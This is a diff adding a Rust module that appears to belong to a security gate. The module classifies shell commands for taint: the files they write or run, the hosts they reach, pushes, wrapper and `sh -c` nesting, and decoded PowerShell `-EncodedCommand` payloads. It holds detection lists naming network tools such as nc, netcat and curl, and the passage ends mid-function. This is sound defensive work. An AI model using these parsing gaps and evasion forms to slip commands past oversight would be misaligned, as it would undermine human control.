@@ -1,0 +1,1342 @@
+//! Reading a shell call for taint: which files it writes, which files it
+//! runs, which hosts it reaches, whether it pushes. The text is the gate's
+//! folded input (`derm_core::policy::fold_text`), so words are lowercase.
+//!
+//! What it follows, and the prior art for each (OpenMoat 0.19.0's
+//! `openmoat-core` classifier, MIT OR Apache-2.0; read, no code copied):
+//! output redirections (`>`, `>>`, `>|`, `&>`, `2>`), `tee`, the destination
+//! of `cp`, `mv`, `install` and `ln`, `curl -o`, `wget -O`, `sed -i` and
+//! `dd of=` as writes; a script an interpreter is given, a program named by a
+//! path (`./run.sh`) and `source` as runs (`session_code.rs`, ADR-039);
+//! inline interpreter code that writes (`python3 -c 'open("x.py","w")'`)
+//! writes every file name it shows as literal text
+//! (`shell/commands/payload/writes.rs`); wrappers (`sudo`, `env`, `timeout`,
+//! `xargs`, `npx`), `sh -c`, `bash -c` and `eval` are read through, four
+//! deep, as `derm_core::command` reads them for command rules (case 144).
+//! Here-document bodies are skipped: they are data, not commands.
+//!
+//! Every reading is conservative where it guesses: a word read as a write or
+//! a host that is not one only asks more (taint only raises).
+
+use super::paths;
+use derm_tap::results::hosts;
+
+/// One simple command: its words, as the shell would pass them.
+#[derive(Clone, Debug, Default, PartialEq, Eq)]
+pub struct Cmd {
+    pub words: Vec<String>,
+}
+
+/// What [`read`] found in a shell call.
+#[derive(Clone, Debug, Default, PartialEq, Eq)]
+pub struct Shell {
+    /// Files written, as the words named them.
+    pub writes: Vec<String>,
+    /// Files run as code, as the words named them.
+    pub runs: Vec<String>,
+    /// Hosts reached, canonical.
+    pub hosts: Vec<String>,
+    /// A `git push` somewhere in the call.
+    pub push: bool,
+    /// Every word of every command, for the secret-path check.
+    pub words: Vec<String>,
+    /// Hosts off this machine that a fetching program (`FETCHERS`) was
+    /// pointed at: what it brought in is untrusted content (box test w6,
+    /// BW6-6).
+    pub fetched: Vec<String>,
+}
+
+impl Shell {
+    /// Adds what another reading of the same call found (a decoded
+    /// `-EncodedCommand` payload's, fix pass 11): every list joined, each
+    /// host once, and a push in either is a push.
+    pub fn merge(&mut self, other: Shell) {
+        self.writes.extend(other.writes);
+        self.runs.extend(other.runs);
+        self.words.extend(other.words);
+        for h in other.hosts {
+            if !self.hosts.contains(&h) {
+                self.hosts.push(h);
+            }
+        }
+        for h in other.fetched {
+            if !self.fetched.contains(&h) {
+                self.fetched.push(h);
+            }
+        }
+        self.push |= other.push;
+    }
+}
+
+/// Programs whose job is to bring a URL's content back: curl and wget (the
+/// two OpenMoat 0.19.0 reads as a fetch, `shell/commands/fetch.rs`), their
+/// kin (HTTPie's `http` and `https`, `xh`, `wget2`, `aria2c`) and the text
+/// browsers that print a page.
+const FETCHERS: &[&str] = &[
+    "curl", "wget", "wget2", "http", "https", "xh", "aria2c", "lynx", "w3m", "links", "elinks",
+];
+
+/// A host on this machine: a local server's page is the person's own. An
+/// address only by its parsed form (review FP1-R3: `127.attacker.example`
+/// is a name, not 127/8).
+fn local_host(h: &str) -> bool {
+    let h = h.trim_start_matches('[').trim_end_matches(']');
+    if let Ok(a) = h.parse::<std::net::IpAddr>() {
+        return a.is_loopback() || a.is_unspecified();
+    }
+    h == "localhost" || h.ends_with(".localhost")
+}
+
+/// The host a fetcher's operand with no scheme names: curl and wget take
+/// `host/path` as `http://host/path` (review FP1-R2; curl 8.5.0, run).
+/// `hosts::host_word` reads only a word shaped like a host (a dot, labels,
+/// no file extension last), so an option's value such as `POST` or
+/// `out.json` is no host (re-review FP1-RR2).
+fn schemeless_host(word: &str) -> Option<String> {
+    if word.starts_with('@') {
+        return None;
+    }
+    hosts::host_word(word)
+}
+
+/// A fetcher option that reads its URLs from a file or stdin, which derm
+/// never sees (re-review FP1-RR1): curl's `-K`/`--config`, wget's,
+/// wget2's and aria2c's `-i`/`--input-file`. The text is folded to lower
+/// case, so curl's `-K` reads as `-k` (`--insecure`) and wget's `-I` as
+/// `-i`: a short form counts only when the call names no target of its own
+/// (`curl -sK -`), and a long form always.
+fn reads_urls_elsewhere(head: &str, word: &str, has_target: bool) -> bool {
+    if word == "--config" || word.starts_with("--config=") {
+        return head == "curl";
+    }
+    if word == "--input-file" || word.starts_with("--input-file=") {
+        return head != "curl";
+    }
+    let Some(short) = word.strip_prefix('-').filter(|w| !w.starts_with('-')) else {
+        return false;
+    };
+    let letter = if head == "curl" { 'k' } else { 'i' };
+    !has_target && matches!(head, "curl" | "wget" | "wget2" | "aria2c") && short.contains(letter)
+}
+
+/// Whether a fetcher's words name a target of their own: a URL, or an
+/// operand read as `http://<operand>` that has a host.
+fn names_target(w: &[String]) -> bool {
+    w[1..].iter().any(|word| {
+        !hosts::url_hosts(word).is_empty()
+            || (!word.starts_with('-')
+                && !word.starts_with('@')
+                && !hosts::url_hosts(&format!("http://{word}")).is_empty())
+    })
+}
+
+const MAX_DEPTH: usize = 4;
+
+/// The lexer's state while it reads one text.
+#[derive(Default)]
+struct Lex {
+    cmds: Vec<Cmd>,
+    outs: Vec<String>,
+    words: Vec<String>,
+    word: String,
+    in_word: bool,
+    heredocs: Vec<(String, bool)>,
+    /// What the next word is for: `None` a plain word; `Some(true)` an
+    /// output target; `Some(false)` an input or a here-string.
+    next_is: Option<bool>,
+    /// The next word is a here-document's delimiter (`true`: `<<-`).
+    delimiter_next: Option<bool>,
+}
+
+impl Lex {
+    fn end_word(&mut self) {
+        if self.in_word {
+            let w = std::mem::take(&mut self.word);
+            if let Some(strip) = self.delimiter_next.take() {
+                self.heredocs.push((w, strip));
+                self.next_is = None;
+            } else {
+                match self.next_is.take() {
+                    Some(true) => self.outs.push(w),
+                    Some(false) => {}
+                    None => self.words.push(w),
+                }
+            }
+        }
+        self.word.clear();
+        self.in_word = false;
+    }
+
+    fn end_cmd(&mut self) {
+        self.end_word();
+        if !self.words.is_empty() {
+            let words = std::mem::take(&mut self.words);
+            self.cmds.push(Cmd { words });
+        }
+    }
+}
+
+/// Splits shell text into simple commands, and the targets of every output
+/// redirection in it.
+pub fn split(text: &str) -> (Vec<Cmd>, Vec<String>) {
+    let chars: Vec<char> = text.chars().collect();
+    let mut l = Lex::default();
+    let mut i = 0;
+    while i < chars.len() {
+        let ch = chars[i];
+        match ch {
+            '\'' => {
+                l.in_word = true;
+                i += 1;
+                while i < chars.len() && chars[i] != '\'' {
+                    l.word.push(chars[i]);
+                    i += 1;
+                }
+            }
+            '"' => {
+                l.in_word = true;
+                i += 1;
+                while i < chars.len() && chars[i] != '"' {
+                    if chars[i] == '\\' && i + 1 < chars.len() {
+                        i += 1;
+                    }
+                    l.word.push(chars[i]);
+                    i += 1;
+                }
+            }
+            '\\' => {
+                l.in_word = true;
+                if i + 1 < chars.len() && chars[i + 1] != '\n' {
+                    l.word.push(chars[i + 1]);
+                }
+                i += 1;
+            }
+            '#' if !l.in_word => {
+                while i < chars.len() && chars[i] != '\n' {
+                    i += 1;
+                }
+                continue;
+            }
+            '\n' => {
+                l.end_cmd();
+                // Here-document bodies follow the line that opened them.
+                for (delim, strip) in std::mem::take(&mut l.heredocs) {
+                    i += 1;
+                    loop {
+                        let start = i;
+                        while i < chars.len() && chars[i] != '\n' {
+                            i += 1;
+                        }
+                        let line: String = chars[start..i].iter().collect();
+                        let line = if strip {
+                            line.trim_start_matches('\t').to_string()
+                        } else {
+                            line
+                        };
+                        if line.trim_end() == delim || i >= chars.len() {
+                            break;
+                        }
+                        i += 1;
+                    }
+                }
+            }
+            ';' | '|' | '(' | ')' | '`' | '\r' => l.end_cmd(),
+            '&' => {
+                if chars.get(i + 1) == Some(&'>') {
+                    // `&>` and `&>>`: both streams to a file.
+                    l.end_word();
+                    i += 1;
+                    while chars.get(i + 1) == Some(&'>') {
+                        i += 1;
+                    }
+                    l.next_is = Some(true);
+                } else {
+                    l.end_cmd();
+                }
+            }
+            '>' | '<' => {
+                if l.in_word && !l.word.is_empty() && l.word.chars().all(|c| c.is_ascii_digit()) {
+                    l.word.clear();
+                    l.in_word = false;
+                }
+                l.end_word();
+                let mut op = String::from(ch);
+                while matches!(chars.get(i + 1), Some('>' | '<' | '&' | '|' | '-')) {
+                    let c = chars[i + 1];
+                    if c == '-' && op != "<<" {
+                        break;
+                    }
+                    op.push(c);
+                    i += 1;
+                }
+                // `>&2` and `2>&-` name a descriptor, not a file.
+                let dup = op.ends_with('&')
+                    && chars
+                        .get(i + 1)
+                        .is_some_and(|c| c.is_ascii_digit() || *c == '-');
+                if dup {
+                    i += 1;
+                    while chars.get(i + 1).is_some_and(|c| c.is_ascii_digit()) {
+                        i += 1;
+                    }
+                } else if op == "<<" || op == "<<-" {
+                    l.delimiter_next = Some(op == "<<-");
+                } else if op.starts_with('>') || op == "<>" {
+                    l.next_is = Some(true);
+                } else {
+                    l.next_is = Some(false);
+                }
+            }
+            c if c.is_whitespace() => l.end_word(),
+            _ => {
+                l.word.push(ch);
+                l.in_word = true;
+            }
+        }
+        i += 1;
+    }
+    l.end_cmd();
+    (l.cmds, l.outs)
+}
+
+fn base(word: &str) -> &str {
+    let b = word.rsplit('/').next().unwrap_or(word);
+    b.strip_suffix(".exe").unwrap_or(b)
+}
+
+fn is_assignment(w: &str) -> bool {
+    let Some((name, _)) = w.split_once('=') else {
+        return false;
+    };
+    let mut c = name.chars();
+    c.next()
+        .is_some_and(|f| f.is_ascii_alphabetic() || f == '_')
+        && c.all(|x| x.is_ascii_alphanumeric() || x == '_')
+}
+
+const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "mksh", "ash", "fish"];
+
+/// Wrappers and the options of each that take a value.
+fn wrapper_values(head: &str) -> Option<&'static [&'static str]> {
+    Some(match head {
+        "sudo" | "doas" => &["-u", "-g", "-c", "-C", "-D", "-h", "-p", "-r", "-t", "-U"],
+        "env" => &["-u", "-C", "--unset", "--chdir"],
+        "timeout" => &["-s", "--signal", "-k", "--kill-after"],
+        "nice" => &["-n", "--adjustment"],
+        "ionice" => &["-c", "-n", "-p"],
+        "xargs" => &[
+            "-n", "-I", "-i", "-P", "-L", "-l", "-d", "-a", "-E", "-e", "-s",
+        ],
+        "stdbuf" => &["-i", "-o", "-e"],
+        "taskset" | "chrt" => &[],
+        "command" | "exec" | "builtin" | "nohup" | "time" | "chronic" | "unbuffer" | "npx"
+        | "bunx" | "pnpx" | "corepack" | "busybox" => &[],
+        _ => return None,
+    })
+}
+
+/// A Windows shell that runs a command string: PowerShell (`powershell`,
+/// `pwsh`) or `cmd`.
+enum WinShell {
+    PowerShell,
+    Cmd,
+}
+
+/// Whether a command's first word is PowerShell or cmd, by its last path
+/// part in any case, `.exe` or not. A Windows path the shell reading has
+/// already lost its backslashes from (`C:WINDOWS...powershell.exe`, unquoted)
+/// still counts when it names a drive: reading more only raises an answer.
+fn windows_shell(first: &str) -> Option<WinShell> {
+    let lower = first.to_ascii_lowercase();
+    let last = lower.rsplit(['/', '\\']).next().unwrap_or(&lower);
+    let name = last.strip_suffix(".exe").unwrap_or(last);
+    let drive = name.contains(':');
+    if matches!(name, "powershell" | "pwsh")
+        || drive && (name.ends_with("powershell") || name.ends_with("pwsh"))
+    {
+        return Some(WinShell::PowerShell);
+    }
+    if name == "cmd" || drive && name.ends_with("cmd") {
+        return Some(WinShell::Cmd);
+    }
+    None
+}
+
+/// What a PowerShell parameter does with the words after it.
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum PsParam {
+    /// A switch: nothing after it is its.
+    Switch,
+    /// Takes the next word as its value.
+    Value,
+    /// `-Command`: the rest of the line is the command.
+    Command,
+    /// `-CommandWithArgs`: the next word is the command, the rest its
+    /// arguments.
+    CommandWithArgs,
+    /// `-EncodedCommand`: the next word is base64 of UTF-16LE.
+    Encoded,
+    /// `-File`, `-help`, `-?`: no command text in the call.
+    NoText,
+}
+
+/// PowerShell's parameters in the order its parser tries them, each with
+/// its smallest unambiguous prefix (`MatchSwitch(switchKey, name,
+/// smallest)`, `CommandLineParameterParser.cs` at PowerShell `cb9cf48`,
+/// lines 914-1279; the values from each branch's `++i`, `ParseFormat`,
+/// `ParseExecutionPolicy`, `ParseCommand`, `CollectArgs`). The first match
+/// wins, as there, so `-co` is `-Command` (run on the box with
+/// powershell.exe 5.1.26100 and pwsh 7.6.10). `-Version` ends pwsh's parse
+/// and takes a value in 5.1; it is read as a value, which reads more.
+const POWERSHELL_PARAMS: &[(&str, &str, PsParam)] = &[
+    ("version", "v", PsParam::Value),
+    ("help", "h", PsParam::NoText),
+    ("?", "?", PsParam::NoText),
+    ("login", "l", PsParam::Switch),
+    ("noexit", "noe", PsParam::Switch),
+    ("noprofile", "nop", PsParam::Switch),
+    ("nologo", "nol", PsParam::Switch),
+    ("noninteractive", "noni", PsParam::Switch),
+    ("socketservermode", "so", PsParam::Switch),
+    ("v2socketservermode", "v2so", PsParam::Switch),
+    ("servermode", "s", PsParam::Switch),
+    ("namedpipeservermode", "nam", PsParam::Switch),
+    ("sshservermode", "sshs", PsParam::Switch),
+    ("noprofileloadtime", "noprofileloadtime", PsParam::Switch),
+    ("interactive", "i", PsParam::Switch),
+    ("configurationfile", "configurationfile", PsParam::Value),
+    ("configurationname", "config", PsParam::Value),
+    ("custompipename", "cus", PsParam::Value),
+    (
+        "commandwithargs",
+        "commandwithargs",
+        PsParam::CommandWithArgs,
+    ),
+    ("cwa", "cwa", PsParam::CommandWithArgs),
+    ("command", "c", PsParam::Command),
+    ("windowstyle", "w", PsParam::Value),
+    ("file", "f", PsParam::NoText),
+    ("isswait", "isswait", PsParam::Switch),
+    ("outputformat", "o", PsParam::Value),
+    ("of", "o", PsParam::Value),
+    ("inputformat", "inp", PsParam::Value),
+    ("if", "if", PsParam::Value),
+    ("executionpolicy", "ex", PsParam::Value),
+    ("ep", "ep", PsParam::Value),
+    ("encodedcommand", "e", PsParam::Encoded),
+    ("ec", "e", PsParam::Encoded),
+    ("encodedarguments", "encodeda", PsParam::Value),
+    ("ea", "ea", PsParam::Value),
+    ("settingsfile", "settings", PsParam::Value),
+    ("sta", "sta", PsParam::Switch),
+    ("mta", "mta", PsParam::Switch),
+    ("workingdirectory", "wo", PsParam::Value),
+    ("wd", "wd", PsParam::Value),
+    (
+        "removeworkingdirectorytrailingcharacter",
+        "removeworkingdirectorytrailingcharacter",
+        PsParam::Switch,
+    ),
+    ("token", "to", PsParam::Value),
+    ("utctimestamp", "utc", PsParam::Value),
+];
+
+/// A PowerShell switch's name without its marker (`GetSwitchKey`, lines
+/// 710-739): one `/`, or a dash (`-`, U+2013, U+2014 or U+2015,
+/// `CharTraits.cs` `IsDash`), a second dash dropped; None for a word that is
+/// no switch.
+fn ps_switch(word: &str) -> Option<String> {
+    let w = word.trim();
+    let first = w.chars().next()?;
+    let dash = |c: char| matches!(c, '-' | '\u{2013}' | '\u{2014}' | '\u{2015}');
+    if !dash(first) && first != '/' {
+        return None;
+    }
+    let mut rest = &w[first.len_utf8()..];
+    if dash(first) {
+        if let Some(c) = rest.chars().next().filter(|c| *c == first) {
+            rest = &rest[c.len_utf8()..];
+        }
+    }
+    Some(rest.to_lowercase())
+}
+
+/// What a PowerShell command line runs, read as PowerShell reads it
+/// ([`POWERSHELL_PARAMS`]): the command text, and whether it came from
+/// `-EncodedCommand`. A bare word starts the command in 5.1 and names a
+/// file in 7; a switch pwsh does not know is an error there and the start
+/// of the command in 5.1 (`-cwa` in 5.1, run on the box). Both are read as
+/// the command, since reading more only raises an answer.
+fn powershell_command(words: &[String]) -> Option<(String, bool)> {
+    let mut i = 0;
+    while i < words.len() {
+        let Some(key) = ps_switch(&words[i]) else {
+            return Some((words[i..].join(" "), false));
+        };
+        if key.is_empty() {
+            i += 1;
+            continue;
+        }
+        let hit = POWERSHELL_PARAMS.iter().find(|(name, smallest, _)| {
+            key.len() >= smallest.len() && name.starts_with(key.as_str())
+        });
+        match hit.map(|h| h.2) {
+            Some(PsParam::Switch) => i += 1,
+            Some(PsParam::Value) => i += 2,
+            Some(PsParam::Command) | Some(PsParam::CommandWithArgs) => {
+                return Some((words[i + 1..].join(" "), false));
+            }
+            Some(PsParam::Encoded) => {
+                return decode_utf16le_base64(words.get(i + 1)?).map(|t| (t, true));
+            }
+            Some(PsParam::NoText) => return None,
+            None => return Some((words[i..].join(" "), false)),
+        }
+    }
+    None
+}
+
+/// Base64 of UTF-16LE text, as PowerShell's `-EncodedCommand` takes it
+/// (`Convert.FromBase64String`, then `Encoding.Unicode.GetChars`:
+/// `PsUtils.cs` `Base64ToString`, lines 419-428). .NET skips white space
+/// inside the base64 and so does this. None for anything else.
+fn decode_utf16le_base64(b64: &str) -> Option<String> {
+    use base64::Engine;
+    let compact: String = b64
+        .chars()
+        .filter(|c| !matches!(c, ' ' | '\t' | '\r' | '\n'))
+        .collect();
+    let bytes = base64::engine::general_purpose::STANDARD
+        .decode(compact)
+        .ok()?;
+    if bytes.len() < 2 || bytes.len() % 2 != 0 {
+        return None;
+    }
+    let units: Vec<u16> = bytes
+        .chunks_exact(2)
+        .map(|c| u16::from_le_bytes([c[0], c[1]]))
+        .collect();
+    String::from_utf16(&units).ok()
+}
+
+/// The command text cmd.exe runs: what follows the first switch that is
+/// `/c`, `/k` or `/r`, with or without a space (`/ctaskkill`), after any
+/// other switches (`/d`, `/q`, `/s`, `/v:on`); cmd's own help and a run on
+/// the box (`w11a.ps1`).
+fn cmd_command(words: &[String]) -> Option<String> {
+    for (i, w) in words.iter().enumerate() {
+        let lower = w.to_ascii_lowercase();
+        let rest = lower.strip_prefix('/')?;
+        if matches!(rest.chars().next(), Some('c' | 'k' | 'r')) {
+            let tail = &w[2..];
+            let mut parts: Vec<&str> = Vec::new();
+            if !tail.is_empty() {
+                parts.push(tail);
+            }
+            parts.extend(words[i + 1..].iter().map(String::as_str));
+            return Some(parts.join(" "));
+        }
+    }
+    None
+}
+
+/// The commands a simple command runs, read through wrappers, shells' `-c`
+/// and `eval`, and PowerShell's and cmd's command strings (WW6R4-1).
+pub fn effective(text: &str) -> (Vec<Cmd>, Vec<String>) {
+    let mut acc = Acc::default();
+    expand_text(text, 0, &mut acc);
+    (acc.out, acc.outs)
+}
+
+/// Every PowerShell `-EncodedCommand` payload the text runs, decoded, at
+/// any depth (fix pass 11). Read from the text as written: base64 keeps its
+/// case only there, so a caller that folds the text (taint, `facts.rs`)
+/// reads each payload from here and folds it on its own.
+pub fn encoded_commands(text: &str) -> Vec<String> {
+    let mut acc = Acc::default();
+    expand_text(text, 0, &mut acc);
+    acc.enc
+}
+
+/// What the reading gathers: the commands, the redirect targets, and the
+/// decoded `-EncodedCommand` payloads.
+#[derive(Default)]
+struct Acc {
+    out: Vec<Cmd>,
+    outs: Vec<String>,
+    enc: Vec<String>,
+}
+
+fn expand_text(text: &str, depth: usize, acc: &mut Acc) {
+    if depth > MAX_DEPTH {
+        return;
+    }
+    let (cmds, o) = split(text);
+    acc.outs.extend(o);
+    for c in cmds {
+        expand(c.words, depth, acc);
+    }
+}
+
+fn expand(mut words: Vec<String>, depth: usize, acc: &mut Acc) {
+    for _ in 0..16 {
+        while words.first().is_some_and(|w| is_assignment(w)) {
+            words.remove(0);
+        }
+        let Some(first) = words.first() else {
+            return;
+        };
+        let head = base(first).to_string();
+        if head == "eval" {
+            expand_text(&words[1..].join(" "), depth + 1, acc);
+            return;
+        }
+        if let Some(kind) = windows_shell(first) {
+            let inner = match kind {
+                WinShell::PowerShell => powershell_command(&words[1..]),
+                WinShell::Cmd => cmd_command(&words[1..]).map(|s| (s, false)),
+            };
+            acc.out.push(Cmd {
+                words: words.clone(),
+            });
+            if let Some((s, encoded)) = inner {
+                if encoded {
+                    acc.enc.push(s.clone());
+                }
+                expand_text(&s, depth + 1, acc);
+            }
+            return;
+        }
+        if SHELLS.contains(&head.as_str()) {
+            if let Some(s) = command_string(&words[1..]) {
+                acc.out.push(Cmd {
+                    words: words.clone(),
+                });
+                expand_text(&s, depth + 1, acc);
+                return;
+            }
+            acc.out.push(Cmd { words });
+            return;
+        }
+        let Some(values) = wrapper_values(&head) else {
+            acc.out.push(Cmd { words });
+            return;
+        };
+        if head == "env" {
+            if let Some(i) = words[1..]
+                .iter()
+                .position(|w| w == "-s" || w == "--split-string")
+            {
+                if let Some(s) = words.get(i + 2) {
+                    expand_text(&s.clone(), depth + 1, acc);
+                }
+                return;
+            }
+        }
+        // The wrapper's own options (and their values), then for `timeout`
+        // its duration; what is left is the command.
+        let mut j = 1;
+        while j < words.len() {
+            let w = words[j].as_str();
+            if w == "--" {
+                j += 1;
+                break;
+            }
+            if is_assignment(w) && head == "env" {
+                j += 1;
+                continue;
+            }
+            if !w.starts_with('-') {
+                break;
+            }
+            let takes = values.contains(&w);
+            j += if takes { 2 } else { 1 };
+        }
+        if head == "timeout" && j < words.len() {
+            j += 1;
+        }
+        if j >= words.len() {
+            return;
+        }
+        words = words[j..].to_vec();
+    }
+}
+
+/// `-c <string>` of a shell, as `derm_core::command` reads it.
+fn command_string(words: &[String]) -> Option<String> {
+    let mut saw_c = false;
+    let mut i = 0;
+    while i < words.len() {
+        let w = words[i].as_str();
+        if w == "--" {
+            return if saw_c {
+                words.get(i + 1).cloned()
+            } else {
+                None
+            };
+        }
+        if !w.starts_with('-') && !w.starts_with('+') {
+            return if saw_c { Some(w.to_string()) } else { None };
+        }
+        if matches!(w, "-o" | "+o" | "--rcfile" | "--init-file") {
+            i += 2;
+            continue;
+        }
+        let letters = &w[1..];
+        if w.starts_with('-')
+            && !letters.is_empty()
+            && letters.bytes().all(|b| b.is_ascii_lowercase())
+            && letters.contains('c')
+        {
+            saw_c = true;
+        }
+        i += 1;
+    }
+    None
+}
+
+/// Interpreters: their inline-code flags, the options that take a value, and
+/// the flags after which no file runs (a module, stdin).
+struct Interp {
+    inline: &'static [&'static str],
+    values: &'static [&'static str],
+    no_file: &'static [&'static str],
+}
+
+fn interpreter(head: &str) -> Option<Interp> {
+    let stem = head.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
+    Some(match stem {
+        "python" | "pypy" => Interp {
+            inline: &["-c"],
+            values: &["-w", "-x", "-q"],
+            no_file: &["-m", "-"],
+        },
+        "node" | "nodejs" => Interp {
+            inline: &["-e", "--eval", "-p", "--print"],
+            values: &[
+                "-r",
+                "--require",
+                "--import",
+                "--loader",
+                "--experimental-loader",
+                "--env-file",
+                "--input-type",
+                "-c",
+            ],
+            no_file: &["-", "--check", "-c", "--test"],
+        },
+        "bun" => Interp {
+            inline: &["-e", "--eval", "-p", "--print"],
+            values: &["-r", "--preload", "--cwd", "--env-file"],
+            no_file: &["-"],
+        },
+        "deno" => Interp {
+            inline: &["eval"],
+            values: &["--config", "-c", "--import-map", "--env-file"],
+            no_file: &["-"],
+        },
+        "ruby" => Interp {
+            inline: &["-e"],
+            values: &["-r", "-i", "-c", "-x"],
+            no_file: &["-"],
+        },
+        "perl" => Interp {
+            inline: &["-e", "-E"],
+            values: &["-m", "-M", "-I"],
+            no_file: &["-"],
+        },
+        "php" => Interp {
+            inline: &["-r"],
+            values: &["-c", "-d"],
+            no_file: &["-"],
+        },
+        "lua" | "luajit" => Interp {
+            inline: &["-e"],
+            values: &["-l"],
+            no_file: &["-"],
+        },
+        "rscript" => Interp {
+            inline: &["-e"],
+            values: &[],
+            no_file: &["-"],
+        },
+        "osascript" | "pwsh" | "powershell" => Interp {
+            inline: &["-e", "-c", "-command"],
+            values: &[],
+            no_file: &["-"],
+        },
+        "tsx" | "ts-node" => Interp {
+            inline: &["-e", "--eval"],
+            values: &[],
+            no_file: &["-"],
+        },
+        _ if SHELLS.contains(&head) => Interp {
+            inline: &["-c"],
+            values: &["-o", "+o", "--rcfile", "--init-file"],
+            no_file: &["-s", "-"],
+        },
+        _ => return None,
+    })
+}
+
+/// A run's script and the inline code it was given, if any.
+fn interpreter_parts(words: &[String], it: &Interp) -> (Option<String>, Option<String>) {
+    let mut i = 1;
+    // `deno run x.ts`, `bun run x.ts`: the subcommand, then the file.
+    if matches!(
+        base(&words[0]).trim_end_matches(|c: char| c.is_ascii_digit() || c == '.'),
+        "deno" | "bun"
+    ) && words.get(1).is_some_and(|w| w == "run")
+    {
+        i = 2;
+    }
+    while i < words.len() {
+        let w = words[i].as_str();
+        if it.inline.contains(&w) {
+            return (None, words.get(i + 1).cloned());
+        }
+        if let Some((flag, code)) = w.split_once('=') {
+            if it.inline.contains(&flag) {
+                return (None, Some(code.to_string()));
+            }
+        }
+        if it.no_file.contains(&w) {
+            return (None, None);
+        }
+        if w == "--" {
+            return (words.get(i + 1).cloned(), None);
+        }
+        if w.starts_with('-') || w.starts_with('+') {
+            i += if it.values.contains(&w) { 2 } else { 1 };
+            continue;
+        }
+        return (Some(w.to_string()), None);
+    }
+    (None, None)
+}
+
+/// Calls in inline code that write a file whatever their arguments
+/// (OpenMoat 0.19.0 `payload/writes.rs`'s list, lowercased since the text
+/// is folded).
+const CODE_WRITERS: &[&str] = &[
+    "write_text",
+    "write_bytes",
+    ".touch(",
+    "shutil.copy",
+    "shutil.move",
+    "os.rename",
+    "os.replace",
+    "os.symlink",
+    "os.link",
+    "writefilesync",
+    "writefile(",
+    "appendfilesync",
+    "appendfile(",
+    "createwritestream",
+    "copyfilesync",
+    "copyfile(",
+    "renamesync",
+    "symlinksync",
+    "deno.writetextfile",
+    "deno.writefile",
+    "bun.write",
+    "file.write",
+    "io.write",
+    "binwrite",
+    "fileutils.",
+    "file_put_contents",
+    "set-content",
+    "add-content",
+    "out-file",
+];
+
+/// Whether inline code opens a file for writing: an `open(` (or `fopen(`,
+/// `opensync(`, `file.new(`) with a mode that writes (`w`, `a`, `x`, `+`), or
+/// an `o_wronly`/`o_creat`-style flag, or Perl's `open(f, ">x")`.
+fn code_writes(code: &str) -> bool {
+    if CODE_WRITERS.iter().any(|w| code.contains(w)) {
+        return true;
+    }
+    if ["o_wronly", "o_rdwr", "o_creat", "o_append", "o_trunc"]
+        .iter()
+        .any(|f| code.contains(f))
+    {
+        return true;
+    }
+    for opener in ["open(", "fopen(", "opensync(", "file.new("] {
+        for (at, _) in code.match_indices(opener) {
+            let rest = &code[at + opener.len()..];
+            let args = &rest[..rest.find(')').unwrap_or(rest.len())];
+            if literals(args).iter().skip(1).any(|m| {
+                let m = m.trim();
+                !m.is_empty()
+                    && m.len() <= 3
+                    && m.chars()
+                        .all(|c| matches!(c, 'w' | 'a' | 'x' | '+' | 'b' | 't' | 'r'))
+                    && m.contains(['w', 'a', 'x', '+'])
+            }) || literals(args)
+                .first()
+                .is_some_and(|l| l.starts_with(['>', '+']))
+            {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+/// The quoted literals of inline code, in order.
+fn literals(code: &str) -> Vec<String> {
+    let mut out = Vec::new();
+    let chars: Vec<char> = code.chars().collect();
+    let mut i = 0;
+    while i < chars.len() {
+        let q = chars[i];
+        if matches!(q, '"' | '\'' | '`') {
+            let mut s = String::new();
+            i += 1;
+            while i < chars.len() && chars[i] != q {
+                if chars[i] == '\\' && i + 1 < chars.len() {
+                    i += 1;
+                }
+                s.push(chars[i]);
+                i += 1;
+            }
+            out.push(s);
+        }
+        i += 1;
+    }
+    out
+}
+
+/// A literal that names a file: a path, or a name with an extension.
+fn names_a_file(l: &str) -> bool {
+    let l = l.trim_start_matches(['+', '>', '<', ' ']);
+    if l.is_empty() || l.len() > 4096 || l.contains(char::is_whitespace) || l.contains("://") {
+        return false;
+    }
+    if l.contains('/') {
+        return true;
+    }
+    match l.rsplit_once('.') {
+        Some((stem, ext)) => {
+            !stem.is_empty()
+                && !ext.is_empty()
+                && ext.len() <= 8
+                && ext.chars().all(|c| c.is_ascii_alphanumeric())
+        }
+        None => false,
+    }
+}
+
+/// Files inline `code` writes: every file name it shows, when it writes at
+/// all (OpenMoat's reading: it cannot tell which name the write goes to).
+pub fn inline_writes(code: &str) -> Vec<String> {
+    if !code_writes(code) {
+        return Vec::new();
+    }
+    literals(code)
+        .into_iter()
+        .map(|l| l.trim_start_matches(['+', '>', '<', ' ']).to_string())
+        .filter(|l| names_a_file(l))
+        .collect()
+}
+
+/// Network programs and the options of each that take a value.
+fn net_values(head: &str) -> Option<&'static [&'static str]> {
+    Some(match head {
+        "curl" => &[
+            "-o",
+            "--output",
+            "-d",
+            "--data",
+            "--data-raw",
+            "--data-binary",
+            "--data-urlencode",
+            "-h",
+            "--header",
+            "-u",
+            "--user",
+            "-x",
+            "--request",
+            "-t",
+            "--upload-file",
+            "-f",
+            "--form",
+            "-a",
+            "--user-agent",
+            "-e",
+            "--referer",
+            "-b",
+            "--cookie",
+            "-c",
+            "--cookie-jar",
+            "-k",
+            "--config",
+            "-m",
+            "--max-time",
+            "-w",
+            "--write-out",
+            "--cacert",
+            "--cert",
+            "--key",
+            "--connect-timeout",
+            "--retry",
+            "-r",
+            "--range",
+            "--resolve",
+            "--connect-to",
+            "-y",
+            "-y",
+            "--json",
+        ],
+        "wget" => &[
+            "-o",
+            "--output-document",
+            "--output-file",
+            "-p",
+            "--directory-prefix",
+            "-a",
+            "-i",
+            "--input-file",
+            "--header",
+            "--user",
+            "--password",
+            "--post-data",
+            "--post-file",
+            "-u",
+            "--user-agent",
+            "-t",
+            "--tries",
+            "-t",
+            "--timeout",
+        ],
+        "ssh" | "scp" | "sftp" | "autossh" => &[
+            "-i", "-p", "-o", "-l", "-f", "-c", "-m", "-b", "-e", "-s", "-o", "-l", "-r", "-d",
+            "-w", "-e",
+        ],
+        "rsync" => &["-e", "--rsh", "--exclude", "--include", "--filter"],
+        "nc" | "ncat" | "netcat" | "telnet" | "ftp" | "http" | "https" | "xh" | "httpie" => &[],
+        _ => return None,
+    })
+}
+
+/// Options after which a word is a file the program writes.
+fn output_flags(head: &str) -> &'static [&'static str] {
+    match head {
+        "curl" => &["-o", "--output"],
